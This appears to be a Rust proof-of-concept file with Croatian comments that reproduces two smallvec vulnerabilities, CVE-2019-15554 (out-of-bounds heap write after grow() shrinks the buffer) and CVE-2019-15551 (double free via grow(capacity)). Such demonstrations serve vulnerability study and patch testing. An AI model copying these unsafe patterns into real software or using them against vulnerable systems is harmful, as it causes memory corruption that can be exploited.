use smallvec::SmallVec;

fn main() {
    // ----------------------------------------------------------------
    // Scenario 1: CVE-2019-15554 — Heap Metadata Corruption
    // grow(n) gdje len ≤ n < capacity → realloc na manji buffer
    // ----------------------------------------------------------------
    println!("[CVE-2019-15554]");
    {
        let mut v: SmallVec<[u8; 4]> = SmallVec::new();
        for i in 0u8..20 { v.push(i); }

        //println!("len={} cap={} spilled={}", v.len(), v.capacity(), v.spilled());

        unsafe {
            //println!("[!] grow(24): {} <= 24 < {} → corruption!", v.len(), v.capacity());
            v.grow(24);  // realloc na manji buffer, len ostaje 20
        }

        // OOB write: len=20, novi cap=24
        // push(20..32) piše izvan realociranog buffera
        for i in 20u8..32 { v.push(i); }
        //println!("[!] OOB write → heap corrupted");
    }

    // ----------------------------------------------------------------
    // Scenario 2: CVE-2019-15551 — Double-Free
    // grow(capacity) → deallocate + drop = 2x free isti pointer
    // ----------------------------------------------------------------
    println!("\n[CVE-2019-15551]");
    {
        let mut v: SmallVec<[u8; 4]> = SmallVec::new();
        for i in 0u8..20 { v.push(i); }

        let cap = v.capacity();
        //println!("len={} cap={} spilled={}", v.len(), cap, v.spilled());

        unsafe {
            //println!("[!] grow({}): double-free!", cap);
            v.grow(cap);  // 1. free: smallvec::deallocate (lib.rs:236)
        }
        // 2. free: Drop::drop (lib.rs:1402) → INVALID FREE
    }
}

